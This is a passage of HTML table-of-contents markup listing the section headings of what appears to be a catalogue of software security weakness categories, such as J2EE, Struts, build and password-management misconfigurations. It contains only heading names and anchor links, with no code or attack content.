class="toc-number">1.4.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-176"><span class="toc-number">1.4.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-175"><span class="toc-number">1.4.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-External-Ivy-Dependency-Repository"><span class="toc-number">1.4.37.</span> <span class="toc-text">Build Misconfiguration: External Ivy Dependency Repository</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-177"><span class="toc-number">1.4.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-178"><span class="toc-number">1.4.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-177"><span class="toc-number">1.4.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-176"><span class="toc-number">1.4.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Build-Misconfiguration-External-Maven-Dependency-Repository"><span class="toc-number">1.4.38.</span> <span class="toc-text">Build Misconfiguration: External Maven Dependency Repository</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-178"><span class="toc-number">1.4.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-179"><span class="toc-number">1.4.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-178"><span class="toc-number">1.4.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-177"><span class="toc-number">1.4.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassLoader-Manipulation-Struts-1"><span class="toc-number">1.4.39.</span> <span class="toc-text">ClassLoader Manipulation: Struts 1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-179"><span class="toc-number">1.4.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-180"><span class="toc-number">1.4.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-179"><span class="toc-number">1.4.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-178"><span class="toc-number">1.4.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flex-Misconfiguration-Debug-Information"><span class="toc-number">1.4.40.</span> <span class="toc-text">Flex Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-180"><span class="toc-number">1.4.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-181"><span class="toc-number">1.4.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-180"><span class="toc-number">1.4.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-179"><span class="toc-number">1.4.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-MIME-Sniffing"><span class="toc-number">1.4.41.</span> <span class="toc-text">HTML5: MIME Sniffing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-181"><span class="toc-number">1.4.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-182"><span class="toc-number">1.4.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-181"><span class="toc-number">1.4.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-180"><span class="toc-number">1.4.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Cookies-Disabled"><span class="toc-number">1.4.42.</span> <span class="toc-text">J2EE Misconfiguration: Cookies Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-182"><span class="toc-number">1.4.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-183"><span class="toc-number">1.4.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-182"><span class="toc-number">1.4.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-181"><span class="toc-number">1.4.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Debug-Information"><span class="toc-number">1.4.43.</span> <span class="toc-text">J2EE Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-183"><span class="toc-number">1.4.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-184"><span class="toc-number">1.4.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-183"><span class="toc-number">1.4.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-182"><span class="toc-number">1.4.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Direct-JSP-Access"><span class="toc-number">1.4.44.</span> <span class="toc-text">J2EE Misconfiguration: Direct JSP Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-184"><span class="toc-number">1.4.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-185"><span class="toc-number">1.4.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-184"><span class="toc-number">1.4.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-183"><span class="toc-number">1.4.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Duplicate-Security-Role"><span class="toc-number">1.4.45.</span> <span class="toc-text">J2EE Misconfiguration: Duplicate Security Role</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-185"><span class="toc-number">1.4.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-186"><span class="toc-number">1.4.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-185"><span class="toc-number">1.4.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-184"><span class="toc-number">1.4.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Duplicate-Servlet-Mapping"><span class="toc-number">1.4.46.</span> <span class="toc-text">J2EE Misconfiguration: Duplicate Servlet Mapping</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-186"><span class="toc-number">1.4.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-187"><span class="toc-number">1.4.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-186"><span class="toc-number">1.4.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-185"><span class="toc-number">1.4.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Excessive-Servlet-Mappings"><span class="toc-number">1.4.47.</span> <span class="toc-text">J2EE Misconfiguration: Excessive Servlet Mappings</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-187"><span class="toc-number">1.4.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-188"><span class="toc-number">1.4.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-187"><span class="toc-number">1.4.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-186"><span class="toc-number">1.4.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Excessive-Session-Timeout"><span class="toc-number">1.4.48.</span> <span class="toc-text">J2EE Misconfiguration: Excessive Session Timeout</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-188"><span class="toc-number">1.4.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-189"><span class="toc-number">1.4.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-188"><span class="toc-number">1.4.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-187"><span class="toc-number">1.4.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling"><span class="toc-number">1.4.49.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-189"><span class="toc-number">1.4.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-190"><span class="toc-number">1.4.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-189"><span class="toc-number">1.4.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-188"><span class="toc-number">1.4.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling-404"><span class="toc-number">1.4.50.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling - (404)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-190"><span class="toc-number">1.4.50.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-191"><span class="toc-number">1.4.50.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-190"><span class="toc-number">1.4.50.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-189"><span class="toc-number">1.4.50.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling-500"><span class="toc-number">1.4.51.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling - (500)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-191"><span class="toc-number">1.4.51.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-192"><span class="toc-number">1.4.51.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-191"><span class="toc-number">1.4.51.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-190"><span class="toc-number">1.4.51.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Incomplete-Error-Handling-throwable"><span class="toc-number">1.4.52.</span> <span class="toc-text">J2EE Misconfiguration: Incomplete Error Handling - (throwable)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-192"><span class="toc-number">1.4.52.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-193"><span class="toc-number">1.4.52.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-192"><span class="toc-number">1.4.52.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-191"><span class="toc-number">1.4.52.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Insufficient-Session-ID-Length"><span class="toc-number">1.4.53.</span> <span class="toc-text">J2EE Misconfiguration: Insufficient Session ID Length</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-193"><span class="toc-number">1.4.53.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-194"><span class="toc-number">1.4.53.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-193"><span class="toc-number">1.4.53.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-192"><span class="toc-number">1.4.53.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Invalid-Servlet-Name"><span class="toc-number">1.4.54.</span> <span class="toc-text">J2EE Misconfiguration: Invalid Servlet Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-194"><span class="toc-number">1.4.54.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-195"><span class="toc-number">1.4.54.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-194"><span class="toc-number">1.4.54.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-193"><span class="toc-number">1.4.54.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Authentication-Method"><span class="toc-number">1.4.55.</span> <span class="toc-text">J2EE Misconfiguration: Missing Authentication Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-195"><span class="toc-number">1.4.55.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-196"><span class="toc-number">1.4.55.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-195"><span class="toc-number">1.4.55.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-194"><span class="toc-number">1.4.55.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Data-Transport-Constraint"><span class="toc-number">1.4.56.</span> <span class="toc-text">J2EE Misconfiguration: Missing Data Transport Constraint</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-196"><span class="toc-number">1.4.56.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-197"><span class="toc-number">1.4.56.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-196"><span class="toc-number">1.4.56.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-195"><span class="toc-number">1.4.56.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Error-Handling"><span class="toc-number">1.4.57.</span> <span class="toc-text">J2EE Misconfiguration: Missing Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-197"><span class="toc-number">1.4.57.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-198"><span class="toc-number">1.4.57.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-197"><span class="toc-number">1.4.57.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-196"><span class="toc-number">1.4.57.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Filter-Definition"><span class="toc-number">1.4.58.</span> <span class="toc-text">J2EE Misconfiguration: Missing Filter Definition</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-198"><span class="toc-number">1.4.58.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-199"><span class="toc-number">1.4.58.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-198"><span class="toc-number">1.4.58.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-197"><span class="toc-number">1.4.58.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Security-Role"><span class="toc-number">1.4.59.</span> <span class="toc-text">J2EE Misconfiguration: Missing Security Role</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-199"><span class="toc-number">1.4.59.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-200"><span class="toc-number">1.4.59.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-199"><span class="toc-number">1.4.59.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-198"><span class="toc-number">1.4.59.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Servlet-Mapping"><span class="toc-number">1.4.60.</span> <span class="toc-text">J2EE Misconfiguration: Missing Servlet Mapping</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-200"><span class="toc-number">1.4.60.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-201"><span class="toc-number">1.4.60.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-200"><span class="toc-number">1.4.60.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-199"><span class="toc-number">1.4.60.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Unsafe-Bean-Declaration"><span class="toc-number">1.4.61.</span> <span class="toc-text">J2EE Misconfiguration: Unsafe Bean Declaration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-201"><span class="toc-number">1.4.61.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-202"><span class="toc-number">1.4.61.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-201"><span class="toc-number">1.4.61.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-200"><span class="toc-number">1.4.61.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Weak-Access-Permissions"><span class="toc-number">1.4.62.</span> <span class="toc-text">J2EE Misconfiguration: Weak Access Permissions</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-202"><span class="toc-number">1.4.62.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-203"><span class="toc-number">1.4.62.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-202"><span class="toc-number">1.4.62.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-201"><span class="toc-number">1.4.62.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Empty-Password-in-Configuration-File"><span class="toc-number">1.4.63.</span> <span class="toc-text">Password Management: Empty Password in Configuration File</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-203"><span class="toc-number">1.4.63.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-204"><span class="toc-number">1.4.63.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-203"><span class="toc-number">1.4.63.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-202"><span class="toc-number">1.4.63.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Password-in-Configuration-File"><span class="toc-number">1.4.64.</span> <span class="toc-text">Password Management: Password in Configuration File</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-204"><span class="toc-number">1.4.64.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-205"><span class="toc-number">1.4.64.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-204"><span class="toc-number">1.4.64.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-203"><span class="toc-number">1.4.64.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Duplicate-Form-Bean"><span class="toc-number">1.4.65.</span> <span class="toc-text">Struts Misconfiguration: Duplicate Form Bean</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-205"><span class="toc-number">1.4.65.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-206"><span class="toc-number">1.4.65.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-205"><span class="toc-number">1.4.65.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-204"><span class="toc-number">1.4.65.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Invalid-Path"><span class="toc-number">1.4.66.</span> <span class="toc-text">Struts Misconfiguration: Invalid Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-206"><span class="toc-number">1.4.66.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-207"><span class="toc-number">1.4.66.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-206"><span class="toc-number">1.4.66.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-205"><span class="toc-number">1.4.66.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Action-Input"><span class="toc-number">1.4.67.</span> <span class="toc-text">Struts Misconfiguration: Missing Action Input</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-207"><span class="toc-number">1.4.67.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-208"><span class="toc-number">1.4.67.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-207"><span class="toc-number">1.4.67.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-206"><span class="toc-number">1.4.67.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Exception-Type"><span class="toc-number">1.4.68.</span> <span class="toc-text">Struts Misconfiguration: Missing Exception Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-208"><span class="toc-number">1.4.68.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-209"><span class="toc-number">1.4.68.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-208"><span class="toc-number">1.4.68.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-207"><span class="toc-number">1.4.68.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Bean"><span class="toc-number">1.4.69.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Bean</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-209"><span class="toc-number">1.4.69.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-210"><span class="toc-number">1.4.69.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-209"><span class="toc-number">1.4.69.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-208"><span class="toc-number">1.4.69.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Bean-Name"><span class="toc-number">1.4.70.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Bean Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-210"><span class="toc-number">1.4.70.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-211"><span class="toc-number">1.4.70.2.</span> <span 